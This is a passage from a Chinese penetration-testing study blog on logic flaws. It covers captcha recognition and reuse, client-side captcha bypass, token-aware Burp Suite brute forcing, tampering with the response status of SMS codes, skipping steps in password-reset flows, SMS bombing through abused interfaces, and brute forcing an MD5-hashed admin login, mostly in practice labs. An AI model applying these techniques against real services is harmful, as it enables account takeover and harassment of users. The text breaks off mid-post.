Token</h2><p><strong>1、token定义：</strong></p><p>token是服务端生成的一串字符串，以作客户端请求的一个令牌。当第一次登录后，服务器生成一个token便将此token返回给客户端，以后客户端只需带上这个token前来请求数据即可，无需再次带上用户名和密码。</p><p><strong>2、token的目的</strong></p><p>为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p><p><strong>3、token时效性</strong></p><ul><li>极度敏感的信息，如钱或银行数据。不要在本地存放Token，存放在内存中，这样随着App关闭Token也就没有了</li><li>对于敏感但跟钱无关，如教育App的学习进度，可以设置为一个月</li><li>对于游戏、社交类App，时间可以更长些，半年或一年</li></ul><p>参考文章：<a href="https://blog.csdn.net/m0_37518413/article/details/103190957">https://blog.csdn.net/m0_37518413/article/details/103190957</a></p><h2 id="0x03-验证码识别插件及工具操作演示-实例"><a href="#0x03-验证码识别插件及工具操作演示-实例" class="headerlink" title="0x03 验证码识别插件及工具操作演示-实例"></a>0x03 验证码识别插件及工具操作演示-实例</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>利用Pkav_Http_Fuzz工具识别验证码</p><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>后台登录框，显示有验证码</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220602220915374.png" alt="image-20220602220915374"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>打开验证码地址</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603164258803.png" alt="image-20220603164258803"></p><p>###0x03</p><p>抓取其数据包</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603165415615.png" alt="image-20220603165415615"></p><p>###0x04</p><p>将数据包头部除去GET方式和Host以及Cookie字段，其他字段和验证码地址放入Pkav_Http_Fuzz识别工具识别（只能识别简单验证码）</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603165837815.png" alt="image-20220603165837815"></p><p>点击识别测试，可以看到识别到了验证码</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603165902341.png" alt="image-20220603165902341"></p><h3 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h3><p>1、识别精度有限</p><p>2、缺少接口，只能加载能够下载的识别库</p><p>3、只能识别简单的验证码</p><p>4、只能使用自带的发包器，不能结合到burpsuite</p><h2 id="0x04-利用BP插件captch-killer识别验证码"><a href="#0x04-利用BP插件captch-killer识别验证码" class="headerlink" title="0x04 利用BP插件captch-killer识别验证码"></a>0x04 利用BP插件captch-killer识别验证码</h2><h3 id="0x00-2"><a href="#0x00-2" class="headerlink" title="0x00"></a>0x00</h3><p>插件captch-killer详解文章：</p><p><a href="https://www.cnblogs.com/nul1/p/12071115.html">https://www.cnblogs.com/nul1/p/12071115.html</a></p><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p>抓包，右键点击插件，如图：</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603171121799.png" alt="image-20220603171121799"></p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603171220840.png" alt="image-20220603171220840"></p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>点击获取验证码</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603171314484.png" alt="image-20220603171314484"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>验证码爆破内容看链接文章，由于接口付费，就不实操了。</p><p>具体使用方法：</p><p>使用burpsuite抓包，右键发送到“captcha-killer”“Send to captcha panel”</p><p>接口URL填识别平台的接口地址</p><p>开始识别</p><p>爆破时使用该插件：“Attack type”选择“Pitchfork”，“Payload type”选择“Extension-generated”，“Extension payload generator”选择“captcha-killer”。不要用多线程。</p><h2 id="0x05-验证码绕过本地及远程验证-本地及实例"><a href="#0x05-验证码绕过本地及远程验证-本地及实例" class="headerlink" title="0x05 验证码绕过本地及远程验证-本地及实例"></a>0x05 验证码绕过本地及远程验证-本地及实例</h2><h3 id="0x00-3"><a href="#0x00-3" class="headerlink" title="0x00"></a>0x00</h3><p>靶场：pikachu</p><h3 id="0x01-基于服务端的验证码绕过（on-server）"><a href="#0x01-基于服务端的验证码绕过（on-server）" class="headerlink" title="0x01 基于服务端的验证码绕过（on server）"></a>0x01 基于服务端的验证码绕过（on server）</h3><p>当随便输入用户名和密码并输入正确验证码后会提示账户不存在</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603172749010.png" alt="image-20220603172749010"></p><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><p>当时输入正确账户输入错误验证码时会提示验证码错误</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603172933598.png" alt="image-20220603172933598"></p><p>这里表明是存在验证码检测的。</p><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>抓取正确验证码的数据包，返回结果没有报验证码错误</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603174011681.png" alt="image-20220603174011681"></p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603174237714.png" alt="image-20220603174237714"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>修改用户名和密码，观察返回包报错信息</p><p>修改密码继续放包，可以看到没有报验证码错误信息，表明这里验证码还是有效的，可以进行验证码复用。</p><p>（由于一般情况，验证码只能使用一次，使用之后第二次复用就会报错）</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603174354021.png" alt="image-20220603174354021"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>这里就可以复用验证码进行爆破。</p><p>设置爆破字段</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603174909366.png" alt="image-20220603174909366"></p><p>设置好爆破字典</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603175206475.png" alt="image-20220603175206475"></p><p>开始爆破。</p><p>可以看到长度不同的表示爆破成功，账户密码为<code>admin，123456</code>。</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603175341992.png" alt="image-20220603175341992"></p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603175532425.png" alt="image-20220603175532425"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>进行一下代码审计，查看为什么能够验证码复用。</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603174729392.png" alt="image-20220603174729392"></p><p>从代码中可以看到验证码在验证完成后没有销毁session导致验证重复使用；<code>session</code>在登录之后是会存在一段时间，而在这段时间没有一直可以利用<code>session</code>值。</p><h3 id="0x06-基于客户端的验证码绕过（on-client）"><a href="#0x06-基于客户端的验证码绕过（on-client）" class="headerlink" title="0x06 基于客户端的验证码绕过（on client）"></a>0x06 基于客户端的验证码绕过（on client）</h3><h3 id="0x00-4"><a href="#0x00-4" class="headerlink" title="0x00"></a>0x00</h3><p>前端验证源代码</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603180355216.png" alt="image-20220603180355216"></p><h3 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h3><p>有些前端验证看不到源代码，是由于加载<code>js</code>文件实现前端验证。</p><p>将验证文件写入新建的<code>1.js</code>中，在主页面文件中加载<code>1.js</code>文件，刷新页面擦查看数据包</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603181029337.png" alt="image-20220603181029337"></p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603181204536.png" alt="image-20220603181204536"></p><h3 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h3><p>随便输入验证码直接抓包，可以看到前端验证并没有执行，数据包直接发送到服务端给出了回复包，成功绕过。</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603181454949.png" alt="image-20220603181454949"></p><h2 id="0x06-Token客户端回显绕过登录爆破演示-实例"><a href="#0x06-Token客户端回显绕过登录爆破演示-实例" class="headerlink" title="0x06 Token客户端回显绕过登录爆破演示-实例"></a>0x06 Token客户端回显绕过登录爆破演示-实例</h2><h3 id="0x00-Token简介"><a href="#0x00-Token简介" class="headerlink" title="0x00 Token简介"></a>0x00 Token简介</h3><p>1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。</p><p>2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p><p>3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p><p>什么是token（例如：在下订单的时候，使用token会防止重复下订单）</p><h3 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h3><p>随意输入账号密码抓包，带有token值</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603182315565.png" alt="image-20220603182315565"></p><h3 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h3><p>重新抓包查看token</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603182541034.png" alt="image-20220603182541034"></p><p>两次token值不同；每一次登录时候就会产生一个token值。</p><h3 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h3><p>放包查看回复包的token值</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603183253758.png" alt="image-20220603183253758"></p><p>这里抓取的数据包中的token值就是回复包中的token值。</p><h3 id="0x04-1"><a href="#0x04-1" class="headerlink" title="0x04"></a>0x04</h3><p>利用BP爆破</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603183612788.png" alt="image-20220603183612788"></p><p>这里线程必须是1，不能多线程。</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603183736910.png" alt="image-20220603183736910"></p><p>设置重定向Always</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603184033573.png" alt="image-20220603184033573"></p><p> 设置grep extract匹配用法，点击添加，查找到token值选择，点击ok。</p><p>（截取回显数据包某个字段，使用正则表达式去匹配这个值。）</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603184347929.png" alt="image-20220603184347929"></p><p>payload2中设置token值使用正则表达式匹配。</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603184605934.png" alt="image-20220603184605934"></p><h3 id="0x05-1"><a href="#0x05-1" class="headerlink" title="0x05"></a>0x05</h3><p>爆破结果显示token值是上一次回复包的token值。</p><p>先截取回复包中的token值，然后再匹配截取到的token值去提交数据包。</p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603184812665.png" alt="image-20220603184812665"></p><h2 id="0x07-Callback自定义返回调用安全-漏洞测试-实例"><a href="#0x07-Callback自定义返回调用安全-漏洞测试-实例" class="headerlink" title="0x07 Callback自定义返回调用安全-漏洞测试-实例"></a>0x07 Callback自定义返回调用安全-漏洞测试-实例</h2><h3 id="0x00-5"><a href="#0x00-5" class="headerlink" title="0x00"></a>0x00</h3><blockquote><p> 什么是callback</p><p>—一般而言，函数的形参是指由外往内向函数体传递变量的入口，但此处加了callback后则完全相反，它是指函数体在完成某种使命后调用外部函数的出口！这时候应该明白什么叫”回调”了吧，也就是回头调用外部函数的意思。 </p></blockquote><h3 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h3><p>这里callback后的数据代表微信登陆，然后将微信登陆数据返回给callback</p><p>callback参数可以更改，可以和跨站漏洞结合</p><p>-在<code>网页源代码搜索传递的参数</code>，如果存在，意味着URL传递的参数会在网页的前端回显，那么，也意味着可以构造XSS漏洞（测试有没有过滤，完不完整） </p><p><img src="/2022/06/02/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/image-20220603190327493.png" alt="image-20220603190327493"></p><h2 id="0x08-上述在实战中如何做到漏洞发现-bp功能点"><a href="#0x08-上述在实战中如何做到漏洞发现-bp功能点" class="headerlink" title="0x08 上述在实战中如何做到漏洞发现-bp功能点"></a>0x08 上述在实战中如何做到漏洞发现-bp功能点</h2><p><strong>原理：逻辑漏洞挖功能点和参数值（关键的参数：id，callback，filename，uid等等）</strong></p><p>抓包发送到爬虫（bp右键点击tools中的find references）</p><p>搜索关键字（使用 discover content模块过滤搜索内容，相当于帮你筛选）</p><p><strong>工作原理相当于集成扫描工具，搜集更多的信息。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 逻辑越权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑越权-找回机制与接口爆破</title>
      <link href="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/"/>
      <url>/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p><strong>1.找回重置机制</strong></p><p>客户端回显：验证码在客户端的浏览器或数据包中可以看到</p><p>Response状态值：页面通过该值返回输入的验证码的对错，可以修改数据包中的值，有回复的状态值如0&#x2F;1，我们可以更改状态值来实现绕过</p><p>验证码爆破：如果验证码范围不大，验证码有效时间足够，没有次数限制，则可以尝试</p><p>找回流程绕过：发送验证码-验证-重置密码，绕过验证码验证，直接请求下一步（找回成功后会跳转到另外一个页面，先通过一个正常用户去获取跳转的URL和数据包，再换一个用户去访问第三步（跳过验证 ））</p><p><strong>2.接口调用乱用</strong></p><p>短信轰炸，来电轰炸(呼死你原理，有些网站有发送数据包的功能，截获网站验证码的数据包，然后利用软件或者程序去进行批量测试，即调用别人网站的接口来实现短信轰炸)</p><h2 id="0x01-绑定手机验证码逻辑-Rep-状态值篡改-实例"><a href="#0x01-绑定手机验证码逻辑-Rep-状态值篡改-实例" class="headerlink" title="0x01 绑定手机验证码逻辑-Rep 状态值篡改-实例"></a>0x01 绑定手机验证码逻辑-Rep 状态值篡改-实例</h2><h3 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h3><p>靶场：夜神模拟器</p><p>攻击机：windows10</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>先在模拟器中修改代理和端口，在BP中设置代理及监听其端口</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220602100107779.png" alt="image-20220602100107779"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>点击福利期货app我的主页-&#x3D;-个人信息—修改密码</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220602100256367.png" alt="image-20220602100256367"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220603164512722.png" alt="image-20220603164512722"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>在修改密码中任意输入短信验证码进行抓包，得到验证码错误的回复包</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220602101350143.png" alt="image-20220602101350143"></p><p>放包之后可以看到短信验证码不正确</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220602101550141.png" alt="image-20220602101550141"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>正常获取验证码，抓取正确验证码的回复包</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220602101834177.png" alt="image-20220602101834177"></p><p>可以观察到正确验证码的回复包是和错误验证码的回复包是有区别的</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220602101914410.png" alt="image-20220602101914410"></p><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>再任意输入验证码抓包，利用BP通过右键do intercept&gt;response to the request，截获返回数据包，放包，将错误的回显改为正确的回显放包</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220602102255849.png" alt="image-20220602102255849"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220603164728024.png" alt="image-20220603164728024"></p><p>错误回显包，更改正确回显包</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220602102421586.png" alt="image-20220602102421586"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220603164822043.png" alt="image-20220603164822043"></p><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p>直接跳转修改密码页面</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/image-20220602102657991.png" alt="image-20220602102657991"></p><h3 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h3><p>重置密码的步骤：1.发送验证码2.验证3.重置密码</p><p>流程绕过原理：1直接—&gt;到3，跳过了验证</p><p>测试：将3个数据包都抓到，在1数据包到2数据包的时候，用工具拦截，直接加载第三个界面 。</p><p>类似的网站类的验证码情况大致相同；</p><p>主要注意一下：是本地回显验证还是服务端回显验证。</p><h2 id="0x02-验证码爆破"><a href="#0x02-验证码爆破" class="headerlink" title="0x02 验证码爆破"></a>0x02 验证码爆破</h2><p><strong>原理分析：</strong></p><p>抓取数据包，将code发送爆破（如果是数字，就可以直接爆破，如果是英文，就要用字典）</p><p>前提条件：1.验证码的存活时间2.验证码的输入次数限制3.有些短信验证码输入一次就改一次（就没法爆破）</p><p>如果是直接显示的图片验证码（这里要识别验证码（插件自动识别））（如果是拖动或者</p><p>识别的验证码就更加复杂）</p><p>（靶场搭建了两天，总是环境有问题，都不能进行注册，之后遇到再补充吧）</p>]]></content>
      
      
      <categories>
          
          <category> 逻辑越权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逻辑越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑越权靶场--后台及订单支付类</title>
      <link href="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/"/>
      <url>/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x00-后台登陆账号密码爆破测试"><a href="#0x00-后台登陆账号密码爆破测试" class="headerlink" title="0x00 后台登陆账号密码爆破测试"></a>0x00 后台登陆账号密码爆破测试</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>靶场：ZBlog博客网站后台密码爆破</p><p>攻击机：windows10</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>利用<code>admin，admin</code>抓取登录时的数据包：</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601094939990.png" alt="image-20220601094939990"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601094911112.png" alt="image-20220601094911112"></p><p>可以看到密码是经过加密的，类型应该是md5。</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>尝试利用BP爆破模块进行密码的暴力破解；</p><p>由于密码是经过加密的，所以这里爆破的时候需要选择Rule：MD5对需要爆破的密码进行加密。</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601095514313.png" alt="image-20220601095514313"></p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601095502105.png" alt="image-20220601095502105"></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>payload长度不一样并且状态码是302，基本可以确定这就是密码，把并且页面已经跳转。</p><p><img src="/2022/06/01/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E9%9D%B6%E5%9C%BA-%E5%90%8E%E5%8F%B0%E5%8F%8A%E8%AE%A2%E5%8D%95%E6%94%AF%E4%BB%98%E7%B1%BB/image-20220601100548802.png" alt="image-20220601100548802"></p><p>查看payload2得到后台密码：<code>0192023a7bbd73250516f069df18b500</code></p><p>经过MD5解密：</p><p><img 